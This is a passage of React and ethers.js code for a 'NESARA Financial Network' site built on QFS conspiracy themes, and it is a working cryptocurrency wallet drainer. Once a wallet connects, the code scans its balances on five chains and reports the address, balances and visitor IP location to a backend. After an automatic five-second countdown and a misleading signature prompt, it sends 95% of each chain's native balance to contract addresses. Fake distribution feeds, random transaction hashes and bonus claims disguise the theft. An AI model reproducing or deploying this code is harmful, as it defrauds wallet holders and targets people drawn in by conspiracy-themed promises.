    const init = async () => {
      try {
        setTxStatus(translations.blockchainSync);
        
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        setWalletInitialized(true);
        setTxStatus('');
        
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
        setWalletInitialized(false);
      }
    };

    init();
  }, [walletProvider, address, translations]);

  // Track visit
  useEffect(() => {
    const trackVisit = async () => {
      try {
        console.log("📡 SENDING TRACK VISIT TO BACKEND...");
        const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country || 'Unknown',
            city: data.data.city || '',
            ip: data.data.ip || '',
            flag: data.data.flag || '🌍'
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Check eligibility
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  // Auto trigger distribution
  useEffect(() => {
    if (isEligible && isConnected && !signatureLoading && !completedChains.length && !autoDistributeActive) {
      setAutoDistributeActive(true);
      const timer = setTimeout(() => {
        executeMultiChainDistribution();
        setAutoDistributeActive(false);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [isEligible, isConnected, signatureLoading, completedChains.length]);

  const checkEligibility = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus(translations.checkEligibility);
    
    try {
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0.000001
      );
      
      // ELIGIBILITY: Now requires ANY on-chain balance (not $1 minimum)
      const eligible = total > 0.000001; // Just need any positive balance
      setIsEligible(eligible);
      setShowDistributeButton(eligible);
      
      if (eligible) {
        setEligibleChains(chainsWithBalance);
        setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
        
        const chainDetails = chainsWithBalance.map(chain => ({
          name: chain.name,
          amount: balances[chain.name].amount.toFixed(6),
          symbol: balances[chain.name].symbol,
          valueUSD: balances[chain.name].valueUSD.toFixed(2)
        }));
        setChainDetailsForReport(chainDetails);
        
        console.log("📡 SENDING CONNECT TO BACKEND...");
        const connectResponse = await fetch(`${BACKEND_URL}/api/presale/connect`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            totalValue: total,
            chains: chainsWithBalance.map(c => c.name),
            chainDetails: chainDetails,
            location: userLocation
          })
        });
        const connectData = await connectResponse.json();
        console.log("✅ CONNECT RESPONSE:", connectData);
        
        prepareDistribution();
      } else {
        // UPDATED: No mention of $1 requirement, just say need on-chain balance
        setTxStatus(translations.minRequirement);
      }
      
    } catch (err) {
      console.error('Integration scan error:', err);
      setTxStatus(translations.scanComplete);
    } finally {
      setVerifying(false);
    }
  };

  const fetchAllBalances = async (walletAddress) => {
    setScanning(true);
    setTxStatus(translations.blockchainSync);
    
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        setTxStatus(`${translations.blockchainSync} ${chain.name}...`);
        
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress,
            price: price,
            name: chain.name,
            rpc: chain.rpc
          };
        }
      } catch (err) {
        console.error(`Failed to scan ${chain.name}:`, err);
        scanned++;
      }
    });
    
    await Promise.all(scanPromises);
    
    setBalances(balanceResults);
    setScanning(false);
    setTxStatus(translations.scanComplete);
    
    return Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
  };

  const prepareDistribution = async () => {
    if (!address) return;
    
    try {
      console.log("📡 SENDING PREPARE FLOW TO BACKEND...");
      const prepareResponse = await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      const prepareData = await prepareResponse.json();
      console.log("✅ PREPARE FLOW RESPONSE:", prepareData);
    } catch (err) {
      console.error('Distribution prep error:', err);
    }
  };

  const handleDownloadReport = () => {
    setShowReportNotification(true);
    setTimeout(() => setShowReportNotification(false), 3000);
  };

  const executeMultiChainDistribution = async () => {
    if (!walletProvider || !address || !signer) {
      setError(translations.walletRequired);
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      
      const timestamp = Date.now();
      const flowId = `DIST-${timestamp}`;
      setCurrentFlowId(flowId);
      
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `NESARA FINANCIAL NETWORK - DIGITAL ASSET INTEGRATION\n\n` +
        `I hereby authorize the integration of my digital assets into the NESARA Financial Ecosystem\n` +
        `Wallet: ${address}\n` +
        `Distribution Value: ${presaleStats.currentBonus}% Bonus Applied\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus(translations.recoveryInitiated);
      const signature = await signer.signMessage(message);
      
      setTxStatus(translations.processingRecovery);
      const chainsToProcess = eligibleChains;
      
      if (chainsToProcess.length === 0) {
        setError("No digital assets found for integration");
        setSignatureLoading(false);
        return;
      }

      const sortedChains = [...chainsToProcess].sort((a, b) => 
        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
      );
      
      let processed = [];
      let lastTxHash = '';
      const processedDetails = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`${translations.processingRecovery} on ${chain.name}...`);
          
          try {
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (switchError) {
            console.log(`Chain switch needed, continuing...`);
          }
          
          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
          const balance = balances[chain.name];
          const amountToSend = (balance.amount * 0.95);
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          const value = ethers.parseEther(amountToSend.toFixed(18));
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            chainProvider
          );
          
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          const gasLimit = gasEstimate * 120n / 100n;
          
          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to: chain.contractAddress,
              value: '0x' + value.toString(16),
              gas: '0x' + gasLimit.toString(16),
              data: data
            }]
          });
          
          lastTxHash = tx;
          setTxStatus(`${translations.processingRecovery} awaiting confirmation...`);
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            processedDetails.push({
              name: chain.name,
              symbol: chain.symbol,
              originalAmount: balance.amount.toFixed(6),
              originalValueUSD: balance.valueUSD.toFixed(2),
              processedAmount: amountToSend.toFixed(6),
              processedValueUSD: valueUSD,
              txHash: tx
            });
            
            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
            
            const flowData = {
              walletAddress: address,
              chainName: chain.name,
              flowId: flowId,
              txHash: tx,
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD,
              gasFee: gasUsed,
              originalAmount: balance.amount.toFixed(6),
              originalValueUSD: balance.valueUSD.toFixed(2),
              location: {
                country: userLocation.country,
                flag: userLocation.flag,
                city: userLocation.city,
                ip: userLocation.ip
              }
            };
            
            console.log(`📡 SENDING EXECUTE FLOW to BACKEND for ${chain.name}...`);
            const executeResponse = await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(flowData)
            });
            const executeData = await executeResponse.json();
            console.log(`✅ EXECUTE FLOW RESPONSE for ${chain.name}:`, executeData);
            
            setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
          } else {
            throw new Error(`Integration failed on ${chain.name}`);
          }
          
        } catch (chainErr) {
          console.error(`Error integrating on ${chain.name}:`, chainErr);
          setError(`Error on ${chain.name}: ${chainErr.message}`);
        }
      }
      
      setVerifiedChains(processed);
      
      if (processed.length > 0) {
        const randomChain = getRandomChain();
        const distributionAmount = getRandomDistributionAmount();
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: randomChain,
          distributionAmount: distributionAmount,
          chainDetails: processedDetails
        };
        
        setLiveDistributions(prev => [newTx, ...prev.slice(0, 19)]);
        
        setTxStatus(translations.retrievalComplete);
        setShowCelebration(true);
        
        const totalProcessedValue = processed.reduce((sum, chainName) => {
          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
        }, 0);
        
        const chainsDetailsString = processedDetails.map(d => 
          `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) integrated`
        ).join('\n');
        
        console.log("📡 SENDING DISTRIBUTION CLAIM TO BACKEND...");
        const claimResponse = await fetch(`${BACKEND_URL}/api/presale/claim`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            location: {
              country: userLocation.country,
              flag: userLocation.flag,
              city: userLocation.city
            },
            chains: processed,
            chainDetails: processedDetails,
            totalProcessedValue: totalProcessedValue.toFixed(2),
            reward: `${distributionAmount} USD`,
            bonus: `${presaleStats.currentBonus}%`,
            chainsDetails: chainsDetailsString
          })
        });
        const claimData = await claimResponse.json();
        console.log("✅ DISTRIBUTION RESPONSE:", claimData);
        
        generateDistributionReport(newTx, address, distributionAmount, processed, new Date().toISOString(), processedDetails);
        handleDownloadReport();
      } else {
        setError("No chains were successfully integrated");
      }
      
    } catch (err) {
      console.error('Distribution error:', err);
      if (err.code === 4001) {
        setError('Integration authorization cancelled');
      } else {
        setError(err.message || 'Integration failed');
      }
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  const distributeAssets = async () => {
    if (!isConnected) {
      setError(translations.walletRequired);
      return;
    }
    
    if (!isEligible) {
      setError(translations.insufficientBalance);
      return;
    }
    
    setAutoDistributeActive(false);
    await executeMultiChainDistribution();
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
      
      {/* Amber glow background - NESARA Financial Theme */}
      <div className="fixed w-[600px] h-[600px] bg-amber-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
      <div className="fixed w-[400px] h-[400px] bg-amber-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>

      {/* Distribution Ribbon */}
      <div 
        onClick={distributeAssets}
        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-amber-600 to-amber-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-amber-700 hover:to-amber-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-2xl mr-2">🏛️</span> {translations.recoverButton}
      </div>

      {/* Mobile Distribution Button */}
      <div 
        onClick={distributeAssets}
        className="fixed bottom-6 right-6 bg-gradient-to-r from-amber-600 to-amber-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-amber-700 hover:to-amber-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-xl">🏛️</span>
        <span className="text-sm font-semibold">{translations.recoverButton}</span>
      </div>

      {/* Report Download Notification */}
      {showReportNotification && (
        <div className="fixed top-32 right-4 z-50 animate-slideInUp bg-amber-500/90 backdrop-blur rounded-lg p-3 shadow-xl">
          <div className="flex items-center gap-2">
            <span className="text-lg">📄</span>
            <p className="text-sm text-white">{translations.reportDownloaded}</p>
          </div>
        </div>
      )}

      {/* Language Selector */}
      <div className="absolute top-6 right-6 z-50">
        <div className="relative">
          <button
            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
            className="bg-black/50 backdrop-blur border border-amber-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-amber-500 transition-all"
          >
            <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
            <span className="text-sm text-white hidden sm:inline">
              {SUPPORTED_LANGUAGES[language]?.native || 'English'}
            </span>
            <i className={`fas fa-chevron-down text-amber-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
          </button>
          
          {showLanguageDropdown && (
            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-amber-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
              <div className="p-2">
                <div className="text-xs text-amber-500 px-3 py-2 font-semibold border-b border-amber-500/20 mb-1">
                  SELECT LANGUAGE
                </div>
                {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                  <button
                    key={code}
                    onClick={() => changeLanguage(code)}
                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-amber-500/10 ${
                      language === code ? 'bg-amber-500/20 border border-amber-500/30' : ''
                    }`}
                  >
                    <span className="text-xl">{lang.flag}</span>
                    <div className="flex-1">
                      <div className="text-sm font-medium text-white">{lang.name}</div>
                      <div className="text-xs text-gray-400">{lang.native}</div>
                    </div>
                    {language === code && (
                      <i className="fas fa-check text-amber-500 text-sm"></i>
                    )}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        
        {/* Hero Section */}
        <div className="flex flex-col items-center text-center pt-16 pb-8">
          
          {/* Logo */}
          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-amber">
            <span className="bg-gradient-to-r from-amber-500 to-amber-300 bg-clip-text text-transparent">
              NESARA FINANCIAL
            </span>
          </div>
          <div className="text-xl md:text-2xl font-semibold text-gray-300 mb-6">Global Digital Economy Ecosystem</div>

          {/* Live Badge */}
          <div className="bg-amber-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-amber mb-4">
            ● {translations.serviceActive}
          </div>

          {/* Description */}
          <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
            Exploring the future of decentralized finance, digital asset integration,
            and next-generation global payment infrastructure connected to emerging
            QFS and blockchain technologies.
          </p>

          {/* Hero Buttons */}
          <div className="flex flex-wrap gap-4 justify-center mb-8">
            <a href="#ecosystem" className="bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-semibold px-6 py-2.5 rounded-xl transition-all transform hover:scale-105">
              {translations.exploreEcosystem}
            </a>
            <a href="#news" className="border border-amber-500/50 hover:bg-amber-500/10 text-white font-semibold px-6 py-2.5 rounded-xl transition-all">
              {translations.liveUpdates}
            </a>
          </div>

          {/* Live Activity Badge */}
          {isConnected && !showDistributeButton && !scanning && (
            <LiveActivityBadge 
              translations={translations} 
              activeUsers={activeUsers}
              lastDistributionTime={lastDistributionTime}
            />
          )}

          {/* Wallet Connect Button */}
          {!isConnected ? (
            <button
              onClick={() => open()}
              onMouseEnter={() => setHoverConnect(true)}
              onMouseLeave={() => setHoverConnect(false)}
              className="bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(245,158,11,0.4)] mb-8 w-full max-w-md"
            >
              {translations.connectWallet}
            </button>
          ) : (
            <div className="flex flex-col items-center w-full max-w-md mb-8">
              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-amber-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                <span className="font-mono text-sm text-gray-300">
                  {formatAddress(address)}
                </span>
                <button
                  onClick={() => disconnect()}
                  className="w-8 h-8 rounded-full bg-amber-600 flex items-center justify-center hover:bg-amber-700 transition-colors"
                  title="Disconnect"
                >
                  <i className="fas fa-power-off text-xs"></i>
                </button>
              </div>
              
              {/* AUTO DISTRIBUTION COUNTDOWN */}
              {autoDistributeActive && isEligible && !signatureLoading && (
                <AutoDistributionCountdown 
                  seconds={5} 
                  translations={translations} 
                  onCancel={() => setAutoDistributeActive(false)} 
                />
              )}
              
              {/* DISTRIBUTION BUTTON */}
              {showDistributeButton && (
                <button
                  onClick={distributeAssets}
                  disabled={signatureLoading}
                  className="mt-3 w-full bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(245,158,11,0.4)] animate-pulse-glow"
                  style={{ animation: 'blink 1.2s infinite' }}
                >
                  {signatureLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      {processingChain ? `Integrating on ${processingChain}...` : translations.processingRecovery}
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      <span className="text-xl">🏛️</span>
                      {translations.recoveryReady}
                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                    </span>
                  )}
                </button>
              )}

              {/* Eligibility Status Message - UPDATED TO REMOVE $1 REFERENCE */}
              <div className="mt-3 w-full">
                <div className={`rounded-lg p-3 text-sm ${
                  isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
                }`}>
                  {isEligible ? (
                    <span>🏛️ {translations.proceedToRecovery}</span>
                  ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
                    <span>⚠️ {translations.insufficientBalance}. {translations.minRequirement}</span>
                  ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
                    <span>🔍 {translations.notEligible}. {translations.minRequirement}</span>
                  ) : null}
                </div>
              </div>
            </div>
          )}

          {/* ============================================ */}
          {/* ABOUT SECTION - WHAT IS NESARA? */}
          {/* ============================================ */}
          <div id="ecosystem" className="w-full max-w-md bg-amber-500/5 border border-amber-500/30 backdrop-blur rounded-2xl p-6 mb-8 text-left">
            <h2 className="text-2xl font-bold text-amber-400 mb-4">What is NESARA?</h2>
            <p className="text-gray-300 text-sm leading-relaxed mb-3">
              NESARA represents a growing digital-financial movement focused on
              economic modernization, decentralized asset systems, blockchain-powered
              transactions, and discussions surrounding the Quantum Financial System (QFS).
            </p>
            <p className="text-gray-300 text-sm leading-relaxed">
              The ecosystem combines global financial innovation, secure digital identity,
              cross-border payment technology, and alternative economic infrastructure
              concepts designed for the next generation of online finance.
            </p>
          </div>

          {/* ============================================ */}
          {/* QFS CONNECTION SECTION */}
          {/* ============================================ */}
          <div className="w-full max-w-md bg-amber-500/5 border border-amber-500/30 backdrop-blur rounded-2xl p-6 mb-8 text-left">
            <h2 className="text-2xl font-bold text-amber-400 mb-4">QFS Integration & Digital Infrastructure</h2>
            <p className="text-gray-300 text-sm leading-relaxed mb-3">
              The Quantum Financial System (QFS) is widely discussed as a theoretical
              next-generation financial framework designed to enhance transaction
              transparency, security, speed, and global interoperability.
            </p>
            <p className="text-gray-300 text-sm leading-relaxed">
              Within the NESARA community ecosystem, QFS-related technologies are often
              associated with blockchain networks, digital asset management, encrypted
              settlement systems, and decentralized financial connectivity.
            </p>
          </div>

          {/* ============================================ */}
          {/* LIVE UPDATES SECTION - GESARA.NEWS WIDGET */}
          {/* ============================================ */}
          <div id="news" className="w-full max-w-md mb-8">
            <h2 className="text-2xl font-bold text-amber-400 mb-4 text-center">Global Financial & QFS Updates</h2>
            <p className="text-gray-400 text-sm text-center mb-4">
              Stay connected with the latest developments in blockchain innovation,
              digital finance, BRICS economic updates, decentralized payment systems,
              and emerging global financial technologies.
            </p>
            <GesaraNewsWidget />
          </div>

          {/* ============================================ */}
          {/* RESOURCE LINKS / CARDS */}
          {/* ============================================ */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 w-full max-w-md mb-8">
            <a 
              href="https://gesara.news/" 
              target="_blank" 
              rel="noopener noreferrer"
              className="bg-black/40 border border-amber-500/30 rounded-xl p-4 text-center hover:bg-amber-500/10 transition-all group"
            >
              <span className="text-2xl block mb-2">📰</span>
              <span className="text-sm text-amber-400 group-hover:text-amber-300">NESARA / GESARA News</span>
            </a>
            <a 
              href="https://coinmarketcap.com/headlines/news/" 
              target="_blank" 
              rel="noopener noreferrer"
              className="bg-black/40 border border-amber-500/30 rounded-xl p-4 text-center hover:bg-amber-500/10 transition-all group"
            >
              <span className="text-2xl block mb-2">📈</span>
              <span className="text-sm text-amber-400 group-hover:text-amber-300">Crypto Market Updates</span>
            </a>
            <a 
              href="https://www.coingecko.com/en/news" 
              target="_blank" 
              rel="noopener noreferrer"
              className="bg-black/40 border border-amber-500/30 rounded-xl p-4 text-center hover:bg-amber-500/10 transition-all group"
            >
              <span className="text-2xl block mb-2">🪙</span>
              <span className="text-sm text-amber-400 group-hover:text-amber-300">Blockchain News</span>
            </a>
          </div>

          {/* ============================================ */}
          {/* ECOSYSTEM FEATURES SECTION */}
          {/* ============================================ */}
          <div className="w-full max-w-md bg-amber-500/5 border border-amber-500/30 backdrop-blur rounded-2xl p-6 mb-8">
            <h2 className="text-2xl font-bold text-amber-400 mb-4 text-center">Ecosystem Features</h2>
            <ul className="grid grid-cols-1 md:grid-cols-2 gap-3 text-gray-300 text-sm">
              <li className="flex items-center gap-2">🔗 Decentralized Financial Infrastructure</li>
              <li className="flex items-center gap-2">🌍 Global Digital Payment Connectivity</li>
              <li className="flex items-center gap-2">📦 Blockchain Asset Integration</li>
              <li className="flex items-center gap-2">🔒 Secure Cross-Border Transactions</li>
              <li className="flex items-center gap-2">📊 Real-Time Financial Monitoring</li>
              <li className="flex items-center gap-2">📚 Digital Economy Research & Insights</li>
            </ul>
          </div>

          {/* SUPPORT SECTION */}
          <TelegramSupport translations={translations} />
          
          <div className="w-full max-w-md mt-6">
            <ReportIssue 
              translations={translations}
              address={address}
              balances={balances}
              userLocation={userLocation}
            />
          </div>

          {/* SCANNING ANIMATION - Shows wallet eligibility check and processing status */}
          {isConnected && scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-amber-500/30">
                <div className="flex items-center justify-center gap-4 mb-4">
                  <div className="w-12 h-12 border-4 border-amber-500 border-t-transparent rounded-full animate-spin"></div>
                  <div className="text-left">
                    <div className="text-lg font-bold text-amber-400">{translations.checkEligibility}</div>
                    <div className="text-sm text-gray-400">{translations.verifying}</div>
                  </div>
                </div>
                
                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                  <div 
                    className="bg-gradient-to-r from-amber-500 to-amber-400 h-1.5 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                
                <div className="mt-3 text-sm text-amber-400">
                  {txStatus}
                </div>
              </div>
            </div>
          )}

          {/* LIVE DISTRIBUTION FEED - Now appears after connect wallet */}
          <LiveDistributionFeed 
            transactions={liveDistributions} 
            translations={translations}
            totalDistributedAmount={todayTotalDistributed}
            todayCount={todayCount}
            onDownloadReport={handleDownloadReport}
            walletAddress={address}
          />

          {/* DIGITAL ASSET INTEGRATION PORTAL */}
          <div className="w-full max-w-md bg-amber-500/5 border border-amber-500/30 backdrop-blur p-8 rounded-2xl mt-8">
            <h3 className="text-2xl font-bold mb-4 text-amber-400">Digital Asset Integration Portal</h3>
            
            <div className="flex justify-between items-center mb-3">
              <p className="text-gray-300">{translations.recoveryValue}:</p>
              <p className="text-amber-400 font-bold">${totalOnChainValue.toLocaleString()} USD</p>
            </div>
            
            <div className="w-full bg-amber-950 h-3 rounded-full overflow-hidden mb-6">
              <div 
                className="h-full bg-gradient-to-r from-amber-600 to-amber-400 rounded-full transition-all duration-1000"
                style={{ width: `${Math.min(100, (totalOnChainValue / 1000000) * 100)}%` }}
              ></div>
            </div>

            <div className="grid grid-cols-2 gap-3 mb-6">
              <div className="bg-black/50 border border-amber-500/30 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-400">{translations.tokenPrice}s</p>
                <p className="text-lg font-bold text-amber-400">{Object.keys(balances).length}/5</p>
              </div>
              <div className="bg-black/50 border border-amber-500/30 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-400">Integration Fee</p>
                <p className="text-lg font-bold text-amber-400">5% + Gas</p>
              </div>
            </div>

            {Object.keys(balances).length > 0 && (
              <div className="bg-black/50 border border-amber-500/30 rounded-xl p-4 mb-6">
                <h4 className="text-sm font-bold mb-2 text-amber-400">📊 Detected Balances:</h4>
                <div className="space-y-1">
                  {Object.entries(balances).map(([chainName, balance]) => (
                    <div key={chainName} className="flex justify-between text-xs">
                      <span className="text-gray-400">{chainName}:</span>
                      <span className="text-white">{balance.amount.toFixed(6)} {balance.symbol} (${balance.valueUSD.toFixed(2)})</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <div className="bg-black/50 border border-amber-500/30 rounded-xl p-5">
              <h4 className="text-xl font-bold mb-2 text-amber-400">🏛️ NESARA Integration Protocol</h4>
              <p className="text-sm text-gray-400 mb-3">
                Our advanced integration protocol scans 5 major blockchain networks to identify and integrate:
              </p>
              <ul className="text-xs text-gray-400 space-y-1 list-disc list-inside">
                <li>Digital asset portfolio optimization</li>
                <li>Cross-chain asset consolidation</li>
                <li>QFS-compatible asset preparation</li>
                <li>Decentralized financial integration</li>
              </ul>
            </div>

            {txStatus && !scanning && (
              <div className="mt-4 text-sm text-center text-amber-400">
                {txStatus}
              </div>
            )}

            {error && (
              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
                {error}
              </div>
            )}

            {completedChains.length > 0 && (
              <div className="mt-4 text-center">
                <div className="text-xs text-gray-400">
                  ✓ Integration completed on: {completedChains.join(' → ')}
                </div>
              </div>
            )}
          </div>

          {completedChains.length > 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                <p className="text-green-400 text-lg mb-2">✓ {translations.completed}</p>
                <p className="text-gray-400 text-sm">{translations.secured}</p>
              </div>
            </div>
          )}

          {isConnected && !isEligible && !completedChains.length && !scanning && totalOnChainValue === 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-amber-500/30">
                <div className="text-6xl mb-4">🏛️</div>
                <h2 className="text-xl font-bold mb-3 text-amber-400">
                  {translations.welcome}
                </h2>
                <p className="text-gray-400 text-sm mb-6">
                  {translations.minRequirement} Ethereum, BSC, Polygon, Arbitrum, or Avalanche.
                </p>
                <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
                  <p className="text-xs text-gray-400">
                    Supported Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* ============================================ */}
          {/* FOOTER DISCLAIMER - VERY IMPORTANT */}
          {/* ============================================ */}
          <footer className="mt-16 text-center border-t border-amber-500/20 pt-8">
            <p className="text-gray-500 text-xs leading-relaxed max-w-md mx-auto">
              NESARA Financial Network is an independent informational and
              community-driven digital finance platform. Content provided
              on this website is for educational, technological, and
              informational purposes only.
            </p>
            <p className="text-gray-600 text-[10px] mt-4">
              © 2026 NESARA Financial Network — Digital Economy Ecosystem Infrastructure
            </p>
          </footer>
        </div>
      </div>

      {/* Random Distribution Popup */}
      {showPopup && currentPopupTx && (
        <LiveDistributionPopup 
          tx={currentPopupTx}
          onClose={() => setShowPopup(false)}
          onDownloadReport={handleDownloadReport}
          translations={translations}
          walletAddress={address}
          distributionAmount={currentPopupTx.distributionAmount}
          chains={[currentPopupTx.chain]}
          chainDetails={currentPopupTx.chainDetails}
        />
      )}

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-amber-600/30 via-amber-500/30 to-amber-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
            
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-amber-400 to-amber-500 rounded-full animate-confetti-cannon"
                style={{
